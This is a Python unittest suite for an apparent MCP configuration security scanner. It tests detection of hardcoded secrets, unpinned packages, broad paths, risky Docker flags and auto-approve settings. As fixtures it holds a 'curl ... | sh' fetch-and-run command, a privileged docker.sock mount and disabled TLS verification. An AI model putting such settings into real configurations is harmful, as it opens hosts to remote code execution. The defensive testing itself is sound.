import json
import os
import stat
import tempfile
import unittest
from pathlib import Path

from mcpaudit.cli import main
from mcpaudit.loader import load_file, strip_jsonc
from mcpaudit.model import ScanResult
from mcpaudit.report import render_json, render_sarif, render_text
from mcpaudit.rules import RULES, audit_file

ROOT = Path(__file__).resolve().parent.parent
DEMO = ROOT / "demo"
FAKE_GH = "ghp_" + "TESTTOKEN" * 4  # 40 chars, fake


def audit(cfg, key="mcpServers"):
    with tempfile.TemporaryDirectory() as d:
        p = Path(d) / "mcp.json"
        p.write_text(json.dumps({key: cfg}))
        os.chmod(p, 0o600)
        return audit_file(load_file(p))


def ids(findings):
    return [f.rule_id for f in findings]


class SecretTests(unittest.TestCase):
    def test_pattern_hit_and_redaction(self):
        fs = audit({"gh": {"command": "x", "env": {"GITHUB_TOKEN": FAKE_GH}}})
        self.assertIn("MCP001", ids(fs))
        blob = json.dumps([f.to_dict() for f in fs])
        self.assertNotIn(FAKE_GH, blob)
        self.assertNotIn("TESTTOKEN", blob)

    def test_reference_not_flagged(self):
        fs = audit({"a": {"command": "x", "env": {"API_KEY": "${API_KEY}", "TOKEN": "${env:TOKEN}"}}})
        self.assertNotIn("MCP001", ids(fs))

    def test_name_based_literal_flagged(self):
        fs = audit({"a": {"command": "x", "env": {"DB_PASSWORD": "correct-horse-battery"}}})
        self.assertIn("MCP001", ids(fs))

    def test_placeholder_and_envname_not_flagged(self):
        fs = audit({"a": {"command": "x", "env": {"API_KEY": "<your-key>", "TOKEN": "MY_TOKEN_VAR", "SECRET": "changeme"}}})
        self.assertNotIn("MCP001", ids(fs))

    def test_secret_in_args_flag_and_next_value(self):
        fs = audit({"a": {"command": "x", "args": ["--api-key", "abcd1234efgh5678"]}})
        self.assertIn("MCP001", ids(fs))

    def test_file_permission_rule(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "mcp.json"
            p.write_text(json.dumps({"mcpServers": {"a": {"command": "x", "env": {"K": FAKE_GH}}}}))
            os.chmod(p, 0o644)
            self.assertIn("MCP012", ids(audit_file(load_file(p))))
            os.chmod(p, 0o600)
            self.assertNotIn("MCP012", ids(audit_file(load_file(p))))


class PinningTests(unittest.TestCase):
    def check(self, command, args):
        return "MCP002" in ids(audit({"s": {"command": command, "args": args}}))

    def test_npx(self):
        self.assertTrue(self.check("npx", ["-y", "pkg"]))
        self.assertTrue(self.check("npx", ["-y", "@scope/pkg@latest"]))
        self.assertTrue(self.check("npx", ["-y", "@scope/pkg"]))
        self.assertFalse(self.check("npx", ["-y", "@scope/pkg@1.2.3"]))
        self.assertFalse(self.check("npx", ["-y", "pkg@1.2.3"]))

    def test_uvx(self):
        self.assertTrue(self.check("uvx", ["tool"]))
        self.assertFalse(self.check("uvx", ["tool==1.0.0"]))
        self.assertFalse(self.check("uvx", ["--from", "tool==1.0.0", "tool"]))

    def test_docker_image(self):
        self.assertTrue(self.check("docker", ["run", "-i", "img"]))
        self.assertTrue(self.check("docker", ["run", "img:latest"]))
        self.assertFalse(self.check("docker", ["run", "img@sha256:" + "a" * 64]))

    def test_local_path_not_flagged(self):
        self.assertFalse(self.check("npx", ["./local-server"]))


class PathTests(unittest.TestCase):
    def test_root_and_home(self):
        self.assertIn("MCP003", ids(audit({"f": {"command": "x", "args": ["/"]}})))
        self.assertIn("MCP003", ids(audit({"f": {"command": "x", "args": ["C:\\"]}})))
        self.assertIn("MCP003", ids(audit({"f": {"command": "x", "args": ["~"]}})))
        self.assertIn("MCP003", ids(audit({"f": {"command": "x", "args": ["/Users/alice"]}})))

    def test_sensitive_dir(self):
        self.assertIn("MCP003", ids(audit({"f": {"command": "x", "args": ["/home/a/.ssh"]}})))

    def test_scoped_ok(self):
        self.assertNotIn("MCP003", ids(audit({"f": {"command": "x", "args": ["./docs", "/home/a/project"]}})))


class RemoteTests(unittest.TestCase):
    def test_http_vs_local(self):
        self.assertIn("MCP004", ids(audit({"r": {"url": "http://example.com/mcp"}})))
        self.assertNotIn("MCP004", ids(audit({"r": {"url": "http://localhost:3000/mcp"}})))
        self.assertIn("MCP005", ids(audit({"r": {"url": "https://example.com/mcp"}})))


class ExecTests(unittest.TestCase):
    def test_curl_pipe_critical(self):
        fs = audit({"h": {"command": "bash", "args": ["-c", "curl -s https://x.example/i.sh | sh"]}})
        self.assertEqual([f.severity for f in fs if f.rule_id == "MCP006"], ["critical"])

    def test_plain_shell_c_medium(self):
        fs = audit({"h": {"command": "sh", "args": ["-c", "node server.js"]}})
        self.assertEqual([f.severity for f in fs if f.rule_id == "MCP006"], ["medium"])

    def test_disabled_controls(self):
        fs = audit({"x": {"command": "tool", "args": ["--no-sandbox"], "env": {"NODE_TLS_REJECT_UNAUTHORIZED": "0"}}})
        self.assertEqual(ids(fs).count("MCP007"), 2)

    def test_exec_capability(self):
        fs = audit({"desktop-commander": {"command": "npx", "args": ["-y", "desktop-commander@1.0.0"]}})
        self.assertIn("MCP009", ids(fs))

    def test_temp_location(self):
        self.assertIn("MCP013", ids(audit({"t": {"command": "/tmp/server"}})))


class DockerTests(unittest.TestCase):
    def test_privileged_sock_hostnet(self):
        fs = audit({"d": {"command": "docker", "args": [
            "run", "--privileged", "--network=host", "-v", "/var/run/docker.sock:/var/run/docker.sock", "img:1.0"]}})
        sev = sorted(f.severity for f in fs if f.rule_id == "MCP008")
        self.assertEqual(sev, ["critical", "high", "medium"])

    def test_safe_container(self):
        fs = audit({"d": {"command": "docker", "args": ["run", "-i", "--rm", "-v", "./data:/data:ro", "img@sha256:" + "b" * 64]}})
        self.assertEqual(fs, [])


class AutoApproveTests(unittest.TestCase):
    def test_levels(self):
        sev = lambda v: [f.severity for f in audit({"a": {"command": "x", "autoApprove": v}}) if f.rule_id == "MCP011"]
        self.assertEqual(sev(["*"]), ["high"])
        self.assertEqual(sev(["write_file"]), ["medium"])
        self.assertEqual(sev(["list_files"]), ["low"])
        self.assertEqual(sev([]), [])


class TrifectaTests(unittest.TestCase):
    def test_split_across_servers(self):
        fs = audit({"web": {"command": "uvx", "args": ["mcp-server-fetch==1.0.0"]},
                    "files": {"command": "npx", "args": ["server-filesystem@1.0.0", "./p"]}})
        self.assertIn("MCP010", ids(fs))

    def test_missing_leg_no_finding(self):
        fs = audit({"files": {"command": "npx", "args": ["server-filesystem@1.0.0", "./p"]}})
        self.assertNotIn("MCP010", ids(fs))


class LoaderTests(unittest.TestCase):
    def test_jsonc(self):
        txt = '{\n // c\n "servers": { "a": { "command": "x", /* b */ "args": ["//not-a-comment"], }, }\n}'
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "mcp.json"
            p.write_text(txt)
            sf = load_file(p)
        self.assertIsNone(sf.error)
        self.assertEqual(sf.servers[0].config["args"], ["//not-a-comment"])

    def test_invalid_json_reported(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "mcp.json"
            p.write_text("{nope")
            self.assertIsNotNone(load_file(p).error)

    def test_strip_jsonc_keeps_strings(self):
        self.assertEqual(json.loads(strip_jsonc('{"u": "http://x/*y*/"}')), {"u": "http://x/*y*/"})


class DemoAndCliTests(unittest.TestCase):
    def test_demo_covers_every_rule(self):
        fs = audit_file(load_file(DEMO / "vulnerable-mcp.json"))
        found = set(ids(fs))
        expected = set(RULES) - {"MCP005", "MCP009", "MCP013"}  # not exercised by the demo file
        self.assertTrue(expected <= found, expected - found)

    def test_clean_demo_has_no_findings(self):
        self.assertEqual(audit_file(load_file(DEMO / "clean-mcp.json")), [])

    def test_exit_codes(self):
        with tempfile.TemporaryDirectory() as d:
            out = str(Path(d) / "r.json")
            self.assertEqual(main(["scan", str(DEMO / "vulnerable-mcp.json"), "-f", "json", "-o", out]), 1)
            self.assertEqual(main(["scan", str(DEMO / "clean-mcp.json"), "-f", "json", "-o", out]), 0)
            self.assertEqual(main(["scan", str(DEMO / "vulnerable-mcp.json"), "--fail-on", "none", "-o", out]), 0)
            self.assertEqual(main(["scan", str(Path(d) / "missing.json")]), 2)
            bad = Path(d) / "bad.json"
            bad.write_text("{nope")
            self.assertEqual(main(["scan", str(bad), "-o", out]), 2)

    def test_reports_render_and_never_leak(self):
        sf = load_file(DEMO / "vulnerable-mcp.json")
        res = ScanResult(files=[sf], findings=audit_file(sf))
        for text in (render_text(res), render_json(res), render_sarif(res)):
            self.assertNotIn("ghp_DEMODEMO", text)
            self.assertNotIn("hunter2hunter2", text)
            self.assertNotIn("AKIAIOSFODNN7EXAMPLE", text)

    def test_sarif_shape(self):
        sf = load_file(DEMO / "vulnerable-mcp.json")
        res = ScanResult(files=[sf], findings=audit_file(sf))
        doc = json.loads(render_sarif(res))
        run = doc["runs"][0]
        self.assertEqual(doc["version"], "2.1.0")
        rule_ids = {r["id"] for r in run["tool"]["driver"]["rules"]}
        for r in run["results"]:
            self.assertIn(r["ruleId"], rule_ids)
            self.assertGreaterEqual(r["locations"][0]["physicalLocation"]["region"]["startLine"], 1)


if __name__ == "__main__":
    unittest.main()
